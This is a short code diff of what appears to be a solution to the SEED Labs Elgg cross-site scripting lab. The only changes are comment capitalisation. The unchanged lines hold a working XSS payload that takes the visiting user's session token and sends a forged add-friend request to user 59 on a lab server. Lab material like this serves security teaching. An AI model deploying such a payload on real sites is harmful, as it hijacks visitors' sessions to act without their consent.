@@ -6,11 +6,11 @@
         var userName = elgg.session.user.username;
         var guid = elgg.session.user.guid;
         var SamyID = 59;
-        if (guid == SamyID) return; // no attack if Samy is the visitor
+        if (guid == SamyID) return; // No attack if Samy is the visitor
         var sendurl = `/action/friends/add?friend=${SamyID}&__elgg_ts=${ts}&__elgg_token=${token}&__elgg_ts=${ts}&__elgg_token=${token}`;
-        //Create and send Ajax request to add friend
+        // Create and send Ajax request to add friend
         var Ajax1 = new XMLHttpRequest();
-        Ajax1.open("GET", sendurl, true); // last boolean value is for asynchronous request making
+        Ajax1.open("GET", sendurl, true); // Last boolean value is for asynchronous request making
         Ajax1.setRequestHeader("Host", "www.seed-server.com");
         Ajax1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         Ajax1.send();
